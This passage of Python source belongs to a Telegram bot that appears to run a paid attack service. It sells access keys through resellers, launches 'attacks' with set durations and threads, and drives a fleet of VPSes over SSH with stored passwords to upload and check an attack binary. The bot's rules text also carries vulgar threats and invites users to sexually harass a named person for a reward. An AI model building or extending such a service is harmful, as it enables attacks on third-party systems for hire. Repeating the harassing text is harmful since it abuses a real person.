    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await message.edit_text(
        f"📤 {file_name} Binary Upload Results:\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n\n"
        f"{result_text}\n\n",
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

async def show_vps_status(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can view VPS status!", parse_mode='Markdown')
        return
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return
    
    # Send initial message
    message = await update.message.reply_text("🔄 Checking VPS statuses...", parse_mode='Markdown')
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    # Get list of busy VPS
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        # Handle case where VPS entry might not have all 3 elements
        if len(vps) < 3:
            # Skip malformed entries or fill with defaults
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            # Create SSH connection with short timeout
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Determine status
            if ip in busy_vps_ips:
                status = "🟡 Busy (Running Attack)"
                busy_vps += 1
            else:
                status = "🟢 Online"
                online_vps += 1
            
            # Check binary status
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ Binary not found"
            else:
                # Check binary version
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ Binary working"
                else:
                    binary_status = f"✅ Working (Version: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"{status}\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Binary: {binary_status}\n"
            )
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"🔴 *Offline/Error*\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Error: `{str(e)}`\n"
            )
            status_messages.append(status_msg)
            offline_vps += 1
    
    # Create summary
    summary = (
        f"\n📊 *VPS Status Summary*\n"
        f"🟢 Online: {online_vps}\n"
        f"🟡 Busy: {busy_vps}\n"
        f"🔴 Offline: {offline_vps}\n"
        f"Total: {len(VPS_LIST)}\n\n"
        f"👑 *Bot Owner:* {get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)}"
    )
    
    # Combine all messages
    full_message = summary + "\n\n" + "\n".join(status_messages)
    
    # Edit the original message with the results
    try:
        await message.edit_text(full_message, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        # If message is too long, send as new messages
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(full_message, parse_mode='Markdown')

async def rules(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in the allowed group.\n\n"
        "3. Do not share your keys with others.\n\n"
        "4. Follow the instructions carefully.\n\n"
        "5. Respect other users and the bot owner.\n\n"
        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
        "JO BHI RITIK KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA.\n\n"
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

async def add_group_id_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can add group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to add to allowed list (include the - sign for negative IDs):*", parse_mode='Markdown')
    return ADD_GROUP_ID

async def add_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id not in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.append(group_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} added successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"ℹ️ *Group ID {group_id} is already in the allowed list.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_group_id_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the group ID to remove from allowed list.*\n\n"
        f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
        parse_mode='Markdown'
    )
    return REMOVE_GROUP_ID

async def remove_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(group_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} removed successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"❌ *Group ID {group_id} not found in allowed list!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def show_menu(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner or co-owners can access this menu!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    if is_owner(update):
        await update.message.reply_text(
            f"📋 *Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
            reply_markup=owner_menu_markup
        )
    else:
        await update.message.reply_text(
            f"📋 *Co-Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_menu_markup
        )
    return MENU_SELECTION

async def back_to_home(update: Update, context: CallbackContext):
    if is_owner(update):
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=owner_markup
        )
    elif is_co_owner(update):
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_markup
        )
    return ConversationHandler.END
    
def sync_bot_files(source_dir, target_dir):
    """Synchronize configuration files between bot instances"""
    try:
        # List of files to synchronize
        sync_files = [
            'vps.txt', 'keys.txt', 'resellers.json',
            'image_config.json', 'display_names.json',
            'links.json'
        ]
        
        # Ensure target directory exists
        os.makedirs(target_dir, exist_ok=True)
        
        # Copy each file
        for file in sync_files:
            source_path = os.path.join(source_dir, file)
            target_path = os.path.join(target_dir, file)
            
            if os.path.exists(source_path):
                shutil.copy2(source_path, target_path)
                
    except Exception as e:
        logging.error(f"Error syncing bot files: {str(e)}")
        
async def periodic_sync(context: CallbackContext):
    """Periodically sync files between bot instances"""
    try:
        configs = load_bot_configs()
        main_data_dir = os.path.dirname(os.path.abspath(__file__))
        
        for config in configs:
            if config.get('active'):
                sync_bot_files(main_data_dir, config['data_dir'])
                
    except Exception as e:
        logging.error(f"Error in periodic sync: {str(e)}")



async def reseller_status_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner or co-owners can check reseller status!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter reseller's username or ID to check status:*\n\n",
        parse_mode='Markdown'
    )
    return GET_RESELLER_INFO

async def reseller_status_info(update: Update, context: CallbackContext):
    input_text = update.message.text.strip()
    
    try:
        # Try to get user by ID
        user_id = int(input_text)
        try:
            user = await context.bot.get_chat(user_id)
        except Exception as e:
            logging.error(f"Error getting user by ID: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        # Try to get user by username
        if not input_text.startswith('@'):
            input_text = '@' + input_text
        try:
            user = await context.bot.get_chat(input_text)
            user_id = user.id
        except Exception as e:
            logging.error(f"Error getting user by username: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    
    if user_id not in resellers:
        await update.message.reply_text("❌ *This user is not a reseller!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    try:
        # Calculate generated keys
        generated_keys = 0
        for key, info in keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        for key, info in special_keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        
        balance = reseller_balances.get(user_id, 0)
        
        # Escape username for Markdown
        username = escape_markdown(user.username, version=2) if user.username else 'N/A'
        
        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
        
        message_text = (
            f"📊 *Reseller Status*\n\n"
            f"👤 *Username:* @{username}\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"💰 *Balance:* {balance} coins\n"
            f"🔑 *Keys Generated:* {generated_keys}\n\n"
        )
        
        # Split message if too long (though this one shouldn't be)
        if len(message_text) > 4000:
            part1 = message_text[:4000]
            part2 = message_text[4000:]
            await update.message.reply_text(part1, parse_mode='Markdown')
            await update.message.reply_text(part2, parse_mode='Markdown')
        else:
            await update.message.reply_text(
                message_text,
                parse_mode='Markdown',
                reply_markup=owner_menu_markup if is_owner(update) else co_owner_menu_markup
            )
    except Exception as e:
        logging.error(f"Error in reseller_status_info: {e}")
        await update.message.reply_text(
            "❌ *An error occurred while processing your request.*",
            parse_mode='Markdown'
        )
    
    return MENU_SELECTION

async def add_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to add.*\n\n",
        parse_mode='Markdown'
    )
    return GET_ADD_CO_OWNER_ID

async def add_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id not in CO_OWNERS:
            CO_OWNERS.append(user_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} added successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"ℹ️ *User ID {user_id} is already a co-owner.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    if not CO_OWNERS:
        await update.message.reply_text("❌ *There are no co-owners to remove!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to remove.*\n\n"
        f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
        parse_mode='Markdown'
    )
    return GET_REMOVE_CO_OWNER_ID

async def remove_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in CO_OWNERS:
            CO_OWNERS.remove(user_id)
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} removed successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS) if CO_OWNERS else 'None'}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
            
            await update.message.reply_text(
                f"❌ *User ID {user_id} is not a co-owner!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def set_display_name_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner or co-owners can set display name!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Check if we're in a group
    if update.effective_chat.type in ['group', 'supergroup']:
        context.user_data['setting_group_name'] = update.effective_chat.id
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"⚠️ Enter the new display name for this group (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
    else:
        # In private chat, ask which group to set
        context.user_data['setting_group_name'] = None
        current_display_name = get_display_name(None)
        
        await update.message.reply_text(
            f"⚠️ Please enter the group ID you want to set the display name for (or 'default' for default name):\n\n",
            parse_mode='Markdown'
        )
    return GET_DISPLAY_NAME

async def set_display_name_input(update: Update, context: CallbackContext):
    if 'setting_group_name' not in context.user_data:
        await update.message.reply_text("❌ Error: Missing context data", parse_mode='Markdown')
        return ConversationHandler.END
    
    group_id = context.user_data['setting_group_name']
    new_name = update.message.text
    
    if group_id is None:
        # We're in private chat and need to get the group ID
        if new_name.lower() == 'default':
            group_id = None
        else:
            try:
                group_id = int(new_name)
                # Verify this is a valid group ID
                if group_id not in ALLOWED_GROUP_IDS:
                    await update.message.reply_text(
                        "❌ This group ID is not in the allowed list!",
                        parse_mode='Markdown'
                    )
                    return ConversationHandler.END
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid group ID! Please enter a numeric group ID or 'default'",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        # Now ask for the actual display name
        context.user_data['setting_group_name'] = group_id
        current_display_name = get_display_name(group_id)
        
        await update.message.reply_text(
            f"⚠️ Now enter the display name you want to set (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
        return GET_DISPLAY_NAME
    else:
        # We have the group ID, set the name
        await set_display_name(update, new_name, group_id)
        return ConversationHandler.END

async def show_uptime(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    uptime = get_uptime()
    
    await update.message.reply_text(
        f"⏳ *Bot Uptime:* {uptime}\n\n",
        parse_mode='Markdown'
    )

async def settings_menu(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner or co-owners can access settings!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        f"⚙️ *Settings Menu*\n\n",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )
    return MENU_SELECTION

async def co_owner_management(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can manage co-owners!*",
            parse_mode='Markdown',
            reply_markup=settings_markup
        )
        return
    
    await update.message.reply_text(
        "👥 *Co-Owner Management*\n\n"
        "Use these commands:\n"
        "/addcoowner - Add a co-owner\n"
        "/removecoowner - Remove a co-owner",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )

async def handle_button_click(update: Update, context: CallbackContext):
    # First check if this is a callback query (button press)
    if update.callback_query:
        await update.callback_query.answer()
        query = update.callback_query.data
        chat = update.callback_query.message.chat
    else:
        # It's a regular message
        query = update.message.text
        chat = update.effective_chat

    if chat.type == "private" and not is_authorized_user(update):
        image = get_random_start_image()
        current_display_name = get_display_name(None)
        
        if update.callback_query:
            await update.callback_query.message.reply_photo(
                photo=image['url'],
                caption=f"❌ *This bot is not authorized to use here.*\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_photo(
                photo=image['url'],
                caption=f"❌ *This bot is not authorized to use here.*\n\n",
                parse_mode='Markdown'
            )
        return

    # ... existing code ...

    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Settings':
        await settings_menu(update, context)
    elif query == 'Co-Owner':
        await co_owner_management(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Generate Key':
        await generate_key_start(update, context)
    elif query == 'Redeem Key':
        await redeem_key_start(update, context)
    elif query == 'Keys':
        await show_keys(update, context)
    elif query == 'Delete Key':
        await delete_key_start(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)
    elif query == '🔍 Status':
        await check_key_status(update, context)
    elif query == 'OpenBot':
        await open_bot(update, context)
    elif query == 'CloseBot':
        await close_bot(update, context)
    elif query == '🔑 Special Key':
        await generate_special_key_start(update, context)
    elif query == 'Menu':
        await show_menu(update, context)
    elif query == '🔗 Manage Links':
        await manage_links(update, context)    
    elif query == 'Back to Home':
        await back_to_home(update, context)
    elif query == 'Add Group ID':
        await add_group_id_start(update, context)
    elif query == 'Remove Group ID':
        await remove_group_id_start(update, context)
    elif query == 'RE Status':
        await reseller_status_start(update, context)
    elif query == 'VPS Status':
        await show_vps_status(update, context)
    elif query == '👥 Check Users':
        await show_users(update, context)    
    elif query == 'Add VPS':
        await add_vps_start(update, context)
    elif query == 'Remove VPS':
        await remove_vps_start(update, context)
    elif query == 'Upload Binary':
        await upload_binary_start(update, context)
    elif query == 'Add Co-Owner':
        await add_co_owner_start(update, context)
    elif query == 'Remove Co-Owner':
        await remove_co_owner_start(update, context)
    elif query == 'Set Display Name':
        await set_display_name_start(update, context)
    elif query == 'Reset VPS':
        await reset_vps(update, context)
    elif query == '⏳ Uptime':
        await show_uptime(update, context)
    elif query == '⚙️ Owner Settings':
        await owner_settings(update, context)
    elif query == 'Add Bot':
        await add_bot_instance(update, context)
    elif query == 'Remove Bot':
        await remove_bot_instance(update, context)
    elif query == 'Bot List':
        await show_bot_list_cmd(update, context)
    elif query == 'Promote':
        await promote(update, context)   
    elif query == '🖼️ Set Group Image':
        await set_group_image_start(update, context)
    elif query == '🔗 Set Group Link':
        await set_group_link_start(update, context) 
    elif query == 'Start Selected Bot':
        await start_selected_bot(update, context)
    elif query == 'Stop Selected Bot':
        await stop_selected_bot(update, context)

async def cancel_conversation(update: Update, context: CallbackContext):
    current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
    
    await update.message.reply_text(
        "❌ *Current process canceled.*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = []
    
    for user_id, key_info in redeemed_users.items():
        if isinstance(key_info, dict):
            if key_info['expiration_time'] <= current_time:
                expired_users.append(user_id)
        elif isinstance(key_info, (int, float)) and key_info <= current_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del redeemed_users[user_id]

        expired_keys = [key for key, info in redeemed_keys_info.items() if info['redeemed_by'] == user_id]
        for key in expired_keys:
            del redeemed_keys_info[key]

    save_keys()
    logging.info(f"Expired users and keys removed: {expired_users}")

def main():
    # Declare globals first
    global TELEGRAM_BOT_TOKEN, OWNER_USERNAME, BOT_DATA_DIR
    
    # Handle command line arguments
    data_dir = None
    if "--data-dir" in sys.argv:
        data_dir = sys.argv[sys.argv.index("--data-dir") + 1]
    
    # If running as child bot instance, use the provided data directory
    if data_dir:
        BOT_DATA_DIR = data_dir
        # Change working directory to the data directory
        os.chdir(data_dir)
    
    # Load configurations from current directory
    load_keys()
    load_vps()
    load_display_name()
    load_links()
    load_image_config()
    load_resellers()
    load_bot_configs()  # Load bot configs if they exist
    
    # Get token and owner from command line if provided
    if "--token" in sys.argv:
        TELEGRAM_BOT_TOKEN = sys.argv[sys.argv.index("--token") + 1]
    if "--owner" in sys.argv:
        OWNER_USERNAME = sys.argv[sys.argv.index("--owner") + 1]
    
    # Create the Application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # ... rest of your main function ...

    # Check if running as specific bot instance
    if len(sys.argv) > 1 and "--token" in sys.argv:
        token_index = sys.argv.index("--token") + 1
        owner_index = sys.argv.index("--owner") + 1
        
        if token_index < len(sys.argv) and owner_index < len(sys.argv):
            TELEGRAM_BOT_TOKEN = sys.argv[token_index]
            OWNER_USERNAME = sys.argv[owner_index]
            # Recreate application with new token
            application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add conversation handlers
    generate_key_handler = ConversationHandler(
       entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
        states={
        GET_KEY_TYPE: [CallbackQueryHandler(generate_key_type)],
        GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )
    
    change_image_handler = ConversationHandler(
        entry_points=[CommandHandler("changeimage", change_image_link)],
        states={
        GET_NEW_IMAGE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_new_image_url)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    change_group_name_handler = ConversationHandler(
        entry_points=[CommandHandler("changegroup", change_group_name)],
        states={
        GET_NEW_GROUP_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_new_group_name)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.Text("Redeem Key"), redeem_key_start)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    delete_key_handler = ConversationHandler(
        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    special_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("🔑 Special Key"), generate_special_key_start)],
        states={
            GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_duration)],
            GET_SPECIAL_KEY_FORMAT: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key_format)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add VPS handlers
    add_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add VPS"), add_vps_start)],
        states={
            GET_VPS_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_vps_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove VPS"), remove_vps_start)],
        states={
            GET_VPS_TO_REMOVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_vps_selection)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    upload_binary_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Upload Binary"), upload_binary_start)],
        states={
            CONFIRM_BINARY_UPLOAD: [
                MessageHandler(filters.Document.ALL, upload_binary_confirm),
                MessageHandler(filters.TEXT & ~filters.COMMAND, lambda update, context: update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown'))
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add co-owner handlers
    add_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Co-Owner"), add_co_owner_start)],
        states={
            GET_ADD_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Remove Co-Owner"), remove_co_owner_start)],
        states={
            GET_REMOVE_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_co_owner_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add display name handler
    display_name_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Set Display Name"), set_display_name_start)],
        states={
            GET_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_display_name_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add reseller status handler
    reseller_status_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("RE Status"), reseller_status_start)],
        states={
            GET_RESELLER_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, reseller_status_info)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add group ID handlers
    add_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Text("Add Group ID"), add_group_id_start)],
        states={
            ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_id_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

